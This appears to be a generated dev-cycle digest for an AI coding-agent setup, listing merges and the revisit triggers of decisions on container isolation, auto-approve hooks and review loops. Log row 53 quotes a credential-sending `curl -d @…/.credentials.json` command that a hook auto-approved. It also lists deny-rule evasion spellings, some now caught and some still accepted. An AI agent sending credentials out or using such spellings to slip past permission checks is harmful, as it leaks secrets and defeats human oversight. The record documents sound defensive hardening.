@@ -1,0 +1,140 @@
+cmd: timeout 60 bash scripts/dev-cycle.sh
+cwd: /workspace/.claude/wt-digest
+time: 2026-09-29T02:26:28-07:00
+# Dev-cycle digest — 2026-09-29
+
+Window: since 2026-09-15 (from no cycle record found, so the default of 14 days (the previous cycle, if any, did not write its record)), on `main` at 4225753.
+
+## 1. Activity
+
+63 merge(s) on `main`'s first-parent line; 558 commit(s) reachable from it, merged branches included.
+
+```
+4225753 2026-09-29 merge: a router skill for every workflow (decision log 66)
+c9a370a 2026-09-29 merge: AGENTS.md names workflows by filename, not @-import (decision log 65)
+ec297d4 2026-09-28 merge: auto-approve hook approves only safe command shapes (decision log 64)
+7bf3b58 2026-09-28 merge: Q-094 exit scan accepts git's standard worktree layout (units A+B)
+f987ed6 2026-09-28 merge: Q-093 cc-push accepts a self-referencing commondir
+c7a6251 2026-09-28 Merge Q-087: k=3 fact-check on the loop's final confirming pass (review/q087)
+6a370cb 2026-09-28 Merge Q-085: ~400-line review-unit size gate (review/q085)
+d943e33 2026-09-28 Merge Q-065: delete the uncalled rejected-history helper (review/q065)
+9e5477a 2026-09-28 Merge Q-086: GNU parallel in the image (review/q086)
+2c32226 2026-09-28 Merge U3: review loops split early, re-review by range, gate on a quiet machine
+0ee9704 2026-09-28 Merge U1: run-tests.sh pins a broken locale, runs named FILEs, re-runs --failed
+f493516 2026-09-28 Merge U4: bound the code-review first-red short-circuit; loop-pass default range
+7387d8f 2026-09-27 Merge Q-076: cc-push and the cc-isolated exit scan (a tripwire)
+b7fbb2a 2026-09-27 Merge Q-077, Q-078, Q-080: auto-approve deny backstop, narrow report stamp, front-loaded skill descriptions
+7d89f6f 2026-09-24 Merge hc1b3/premortem (HC1 batch 3)
+1d0d091 2026-09-24 Merge hc1b3/whatif (HC1 batch 3)
+2a1a100 2026-09-24 Merge hc1b3/depup (HC1 batch 3)
+5d9fd7f 2026-09-24 Merge hc1b3/teststrat (HC1 batch 3)
+0430866 2026-09-24 Merge hc1b3/techdebt (HC1 batch 3)
+1293b56 2026-09-24 Merge hc1b2/moat (HC1 batch 2)
+255c48a 2026-09-24 Merge hc1b2/mkt (HC1 batch 2)
+b61bfd4 2026-09-24 Merge hc1b2/ue (HC1 batch 2)
+ad4afa3 2026-09-24 Merge hc1b2/personas (HC1 batch 2)
+7fb4577 2026-09-24 Merge hc1b2/yglesias (HC1 batch 2)
+7ef4ebf 2026-09-23 Merge branch 'ans/copy-install' into answers-2026-09-20
+5bd5c66 2026-09-23 Merge branch 'ans/guard-q048-q050' into answers-2026-09-20
+fd0ad24 2026-09-21 Merge branch 'ans/fixguard2' into answers-2026-09-20
+5ab5c36 2026-09-21 Merge branch 'ans/fixsi' into answers-2026-09-20
+1759fc8 2026-09-21 Merge branch 'ans/fixguard' into answers-2026-09-20
+567873f 2026-09-21 Merge branch 'ans/fixquestions' into answers-2026-09-20
+… 33 more
+```
+
+## 2. Revisit triggers
+
+No earlier cycle record to carry verdicts from, so every trigger is printed in full.
+Decide each printed one: fired / not fired / cannot tell, with the evidence. A fired trigger becomes a questions.md entry.
+
+### docs/decisions/014-secure-tool-guidance-layers.md (last changed 2026-09-26)
+How to read: each entry is a concrete, observable condition that should
+prompt re-evaluating this decision. Future readers can grep this section when
+their context changes.
+if same-session repeat denials for table-listed tools persist in ≥2 sessions after 2 weeks → revive the post-failure hint hook. if another 4d39475-class incident occurs in a suite the lint passed → escalate lint to the capability-manifest harness. if the spike shows nested bwrap works on WSL2 → open an RPI for per-suite confinement (and reconsider pruned candidate 15). if the allowlist gains/loses >5 prefixes in one edit → re-run the drift test and re-check the CLAUDE.md table. if Claude Code ships native denial-message customization → the deferred hint hook becomes a config entry, not a hook.
+
+### docs/decisions/015-cc-process-isolation-docker-devcontainer.md (last changed 2026-09-26)
+How to read: each entry is a concrete, observable condition that should prompt
+re-evaluating this decision. Future readers can grep this section when their context
+changes to see whether earlier decisions still apply.
+If the Reverse trigger fires (Desktop unavailable) → implement [4] podman rootless. If devcontainer breakage exceeds 1/week over any 2-week window → Revisit branch. If Anthropic ships a first-party whole-process sandbox for Claude Code (not just Bash) → re-run step 4; this decision may be obsoleted upstream. If CC sessions drift back to running on the host for >20% of work after week 2 → the boundary is failing behaviorally, Revisit. If Docker Desktop licensing changes for this use → Reverse to podman. If the SI loop cannot launch inside the container non-interactively (H5) → Revisit before relying on overnight isolation.
+
+### docs/decisions/016-multi-project-devcontainer-central-config.md (last changed 2026-09-26)
+How to read: each entry is a concrete, observable condition that should prompt re-evaluating this
+decision. Future readers can grep this section when their context changes to see whether earlier
+decisions still apply.
+If `--override-config` cannot resolve the `Dockerfile` build context from outside the workspace → fall back to referencing a prebuilt `claude-base` image by tag (the base-image sub-mechanism makes this a small change, not a redesign). If ≥1 project needs a repo-local `.devcontainer/` (a pre-existing devcontainer, or an IDE-attach workflow that the CLI launcher can't serve) → implement candidate **[4] hybrid**, the pre-named fallback, rather than re-opening the DD. If VS Code Dev Containers attach becomes a required workflow rather than a nice-to-have → same, [4]. If the number of isolated projects exceeds ~10 and per-project image builds exceed ~2 min each → the shared base image is no longer optional; make it a hard prerequisite. If a stale installed config is observed causing a boundary regression more than once → move the install step into the launcher itself (auto-install on hash mismatch, still gated by the manifest). If decision 015's Reverse trigger fires (Docker Desktop unavailable → podman rootless) → the central config must be re-verified against podman's `--override-config` support before assuming this decision carries over.
+
+### docs/decisions/017-polyglot-test-hermeticity.md (last changed 2026-09-26)
+How to read: each entry is a concrete, observable condition that should prompt re-evaluating this decision.
+Future readers can grep this section when their context changes.
+if a project with a real pytest/vitest/cargo suite adopts the lint and the false-positive rate exceeds ~1 per 20 suites → escalate that language's adapter from grep to an AST matcher (pruned candidate [7]; for Go, read `sonatard/noctx` first). if `unshare -rn` or `bwrap` becomes available inside the agent's devcontainer again → revive layer 2 as an in-session gate and re-run the 014 layer-3 RPI. if a fourth language is added and it needs a *third* closure resolver → the rules-as-data contract is not paying for itself; collapse to a single AST engine. if a consuming project already runs `pre-commit` → ship pruned candidate [11] as the distribution channel. if Node's `--permission` model is confirmed to propagate into jest/vitest worker threads → a JS-native baseline blocker becomes viable and the JS adapter's config-tier check should look for it. if any suite passes the lint and still makes a live network call → the over-approximation has a hole; escalate to the runner and file the counter-example as a fixture.
+
+### docs/decisions/021-reviewer-context-management.md (last changed 2026-09-26)
+How to read: each entry is a concrete, observable condition that should prompt
+re-evaluating this decision. Future readers can grep this section when their context
+changes to see whether earlier decisions still apply.
+`if Stage 1 is ever pointed at a repo not fully owned by the operator — add a secret-screening pass first (the harness ships whole files + branch diff to third-party APIs with no filtering; 2026-07-31 review finding A12). if a re-run of D3/D4 under Stage 1 still reproduces Results 3c or 5 (sibling-commit/heredoc misattribution). if Stage-1 whole-file+branch-diff prompts push the **median** per-call cost above the ~$0.33 band (the diff-only Kimi per-call median; pinned 2026-07-31 — a single reasoning-heavy outlier does not trip it, and under a per-call reading the 2026-07-31 sweep's $0.388 worst call would already have fired this trigger while the median $0.226 held) or a sweep above $10. if a cross-file symbol FP rate is measured high enough to justify Stage 2's repo-map build. if a portable OpenRouter model gains reliable, uniform tool-calling that would let #6 satisfy H2/H3. if the production agentic critic is retired, removing the Stage-3 re-verify authority #9 depends on. if a measured cheap-critic recall gain fails to survive the Stage-3 re-verify gate (hypothesis #9 counter-evidence).`
+
+### docs/decisions/028-escalation-second-channel.md (last changed 2026-09-26)
+How to read: each entry is a concrete, observable condition that should prompt
+re-evaluating this decision. Future readers can grep this section when their context
+changes to see whether earlier decisions still apply.
+`if the falsifier's replay lifts a row on ND3's fixed sim.ts:625-628 or md1's proxy.ts:14 (either negative control) → tighten the trigger or revert to candidate [1]. if the ND2 replay produces no lift in 2/3 sessions because critics don't quote both sides → the quote-pair bar is unreachable in practice; consider requiring critics to emit the quote pair explicitly. if ≥3 Contested-Soundness rows across 10 archived rubrics are adjudicated wrong by the author → the precision guard is too loose; re-run this DD's step 4. if the replay validation passes (ND2 lift ≥2/3, negative controls 0/3) and a corpus of ≥10 correct lifts accumulates → a follow-up decision may consider the 🟡→🔴 question, which this record deliberately does not grant. if open question #6 is answered directly (an owner-cap-removal replay on ND2) → fold its result into the exception's scope. if the Escalation Rule is redesigned wholesale → this channel's "does not corroborate escalation" bar must be re-derived, not assumed.`
+
+### docs/decisions/030-lightweight-review-path.md (last changed 2026-09-26)
+How to read: each entry is a concrete, observable condition that should prompt
+re-evaluating this decision; grep here when context changes.
+`if the 10-instance dry run shows >10% schema parse failures or median call cost > $0.35 ([0]'s counter-evidence).` `if the v2 judge ranks any arm ([3]/[7]/[8]) above [0] on WUS at comparable cost — promote that arm to the spine.` `if lightweight-arm verified recall < 40% of the agentic arm's on the benchmark — the loop reviewer is too blind to loop on; revisit [5] cascade.` `if loop finding-churn is observed ≥3 iterations on one branch despite the previously-reported label — build the delta-review [9] optimization.` `if the harness is pointed at a non-operator-owned repo — add the secret-screening pass first (021 trigger, restated).` `if the production agentic critic is retired — the re-verify authority disappears and this decision's Stage-3 dependence breaks (021 trigger, restated).`
+
+### docs/decisions/031-review-loop-tier-and-factcheck-policy.md (last changed 2026-09-28)
+`if a behavioral or security red is merged that a k=3 pass would have caught and k=1 across the actual number of passes did not — k=1 is under-sampling; restore k=2+ (029's recall was real).`
+`if 2-clean routinely fails to converge (a spurious red keeps resetting the clean counter) — T's carve-out is too narrow and marginal reds are still volatile; widen the comment-only demotion or add k back for stability.`
+`if comment-only ambers are being acked-not-fixed and docs are rotting — the "fix costs the same as ack" assumption broke; make comment-Incorrect ambers fix-mandatory.`
+`if the fix-drift lite-check misses a fix-introduced defect that a full pass then catches — the drift gate is too narrow; widen it or accept the full-pass cost.`
+`if a replication on a second instance (fscompat, deferred behind this decision) shows the arm gap or round count is NOT variance-dominated — the "verdict-draw variance drives loop length" premise is wrong and this whole policy needs re-derivation.`
+`if a comment-only demotion ever lets a load-bearing rationale (a future-change-misleading security comment) reach merge stale — the carve-out failed; make security/contract-rationale comment-Incorrect stay red explicitly.`
+
+### docs/decisions/035-install-sh-gating.md (last changed 2026-09-26)
+How to read: each entry is a concrete, observable condition that should prompt re-evaluating this decision.
+Future readers can grep this section when their context changes to see whether earlier decisions still apply.
+`if a second operator gains host access → [7] becomes live, since "the reviewer must not live where the reviewed can write" stops being a solo-dev abstraction.` `if any commit touching devcontainer-config/install.sh lands with no Live-verified: trailer and no block after A7 is installed → [3]'s hypothesis is refuted; implement [8].` `if host-side commits touching install.sh appear in git log (author not a container session) → the failure-driven residual has materialised; implement [8] as the complement.` `if hooks/wiring.json's live-verify-gate entry is ever removed, or live settings lose it again → this decision is inert and R1 re-opens.` `if install.sh is ever added to PAYLOAD or enforcement_files() → H3 changed; re-run the matrix, [5] may become viable.`
+
+### docs/decisions/036-cc-isolated-repo-split.md (last changed 2026-09-17)
+How to read: each entry is a concrete, observable condition that should prompt
+re-evaluating this decision. Future readers can grep this section when their context
+changes to see whether earlier decisions still apply.
+`if a second operator or a second machine needs cc-isolated without the workflows payload → the accessibility motive has arrived and [12] becomes the first move (seam), then [4].` `if any commit has to touch both devcontainer-config/ and skills|workflows|patterns for a non-doc reason → the 1-of-43 confinement figure is stale; re-run the matrix.` `if a second consumer of the claude-home payload appears (anything other than cc-isolated staging it) → [11]'s seam is owed regardless of the split, since the cp -r would then encode one consumer's layout assumption for two.` `if docs/decisions/log.md or docs/working/questions.md is split per-subsystem for unrelated reasons → finding 1's shared-ledger objection drops from 21-and-10 of 43 to near zero, and [7] then [2] become materially cheaper.` `if scripts/run-tests.sh grows a per-subsystem selector and cc-isolated's suites still cannot be run alone → finding 3 was wrong; re-open H4.` `if the workflows side acquires a release cadence (versioned skills, external consumers) that cc-isolated should not be coupled to → [4]'s pinned artifact becomes the shape to revisit first.`
+
+### docs/decisions/037-bare-host-copy-install.md (last changed 2026-09-26)
+How to read: each entry is a concrete, observable condition that should prompt re-evaluating this decision. Future readers can grep this section when their context changes to see whether earlier decisions still apply.
+`if Q-049 is resolved → reconsider automating the settings.json merge from the host target.` `if any host ~/.claude install is traced to an agent session (backup stamp with no human at the terminal) → the TTY rule has failed in practice; move the host install off the agent-writable repo or require a sandbox denyWrite check before install.` `if 035's regex lands → confirm devcontainer-config/install.sh is covered, and drop the manual Live-verified trailers.` `if the user reports ~/.claude going stale again → the two-prompt run is being declined by reflex; consider H (a SessionStart staleness warning).` `if Gemini or Antigravity comes back into use → add it as a third target in the same run, not as a flag.` `if Claude Code's process shape changes (no token claude or .../claude, and none of the /@anthropic-ai/claude-code/, /claude/versions/ or /claude-agent-sdk/ paths CLAUDE_PROC_RE matches) or cc-isolated stops labelling containers cc-project → the Q-058 probe goes blind; update CLAUDE_PROC_RE or the docker filter.`
+- log row 35 (2026-08-07): revisit at the A8 post-restructure measurement. 
+- log row 53 (2026-09-18): Revisit if the hook is ever relied on as a security control or the sandbox is removed. **Amended 2026-09-27 (Q-070 [1], Q-077):** in cc-isolated the sandbox was never there. The image has no bwrap or socat and the container refuses unprivileged user namespaces (`unshare -Ur` → EPERM), so the revisit condition held from the start and the reviewer's `curl -d @…/.credentials.json` inside `$(( ))` was auto-approved (re-run first-hand: `allow`). The boundary there is now `permissions.deny` alone. `hooks/wiring.json` adds `Bash(*.credentials.json*)`, and the hook checks Bash deny rules itself, because a hook decision can override `permissions.deny` (#39344, shown for `ask`; not verified for `allow`, Claim 20b). Until a host check settles that, the hook's deny check is load-bearing in cc-isolated, so the revisit condition above now applies and the hook is held to it. After the 2026-09-27 critic panel: deny loading fails closed (an unreadable or ill-shaped settings file, or bad `--deny`, means no approval on that call); allow and deny share one settings-file list, one jq pass and one rule parser; the global file is `${CLAUDE_CONFIG_DIR:-$HOME/.claude}/settings.json`, as the linker writes it; and rules also match the de-quoted command, so `.cred""entials.json` and `git "push"` no longer get through. Still accepted: a spelling that never contains the denied string (a glob such as `.cred*`, a variable set by an earlier command); those are pinned by tests. What the check guarantees, its residuals and the allow-vs-deny rule table live in the hook header only. **Amended 2026-09-28 (Q-082):** a host test settled Claim 20b. Under a PreToolUse hook that always returned `allow`, a Bash call matching `permissions.deny` was still denied (the user confirmed via `/hooks` that the hook loaded). A hook `allow` does not override deny, so the hook's deny reader is redundant for `allow`; its removal is Q-092. The sandbox half of Q-070 [1] is not built: it needs image and runArgs changes that are open as a follow-up question (Q-081). 
+- log row 57 (2026-09-27): Revisit if the Q-075 hermetic run shows side effects that can't be contained. 
+- log row 58 (2026-09-27): Revisit if a caller needs to tell "declined" from "failed". 
+- log row 60 (2026-09-27): Revisit if loop measurements show the forced full panel finding nothing the terminal pass would not have found in time. 
+- log row 62 (2026-09-28): Revisit if stacking overhead dominates small features, or if units under the cap still balloon during review. 
+- log row 63 (2026-09-28): Revisit, lowering this pass's k, if final-pass replicate agreement on untouched code stays ≥90% over ≥20 claims (the state doc §1.1 k-reduction falsifier behind log row 27, `docs/thoughts/code-review-evaluation-state.md`, applied to this pass). 
+- log row 65 (2026-09-28): Revisit if Claude Code's import grammar widens, or a false alarm forces rewording a guarded file more than once. The sections AGENTS.md shares with the global instructions (Context Packing, Shared Thoughts, General Principles) stay, since other agents read AGENTS.md without the global file. 
+- log row 66 (2026-09-29): Revisit if, over the first three dev cycles after install, multi-file merges still land without the RPI research/plan docs or pr-prep review artifacts they should carry (an artifact count, not the usage log), which would mean selection, not discovery, is the bottleneck. 
+
+## 3. Watched questions (trigger and deferred routes)
+
+- Q-067  deferred        regenerate-skill-eval-reports
+- Q-098  deferred        global-allowlist-after-sandbox
+- Q-074  trigger         failure-pattern-writer-trigger
+- Q-090  trigger         run-tests-jobs
+
+Open by route: agent=7, deferred=2, trigger=2, you: terminal=1
+
+## 4. Spot-check sample
+
+- acd76c4 2026-09-18 Merge branch 'si/fmt'
+- 567873f 2026-09-21 Merge branch 'ans/fixquestions' into answers-2026-09-20
+
+## 5. Roadmap
+
+No docs/roadmap.md yet — create it this cycle from the template in the dev-cycle skill.
+exit: 0
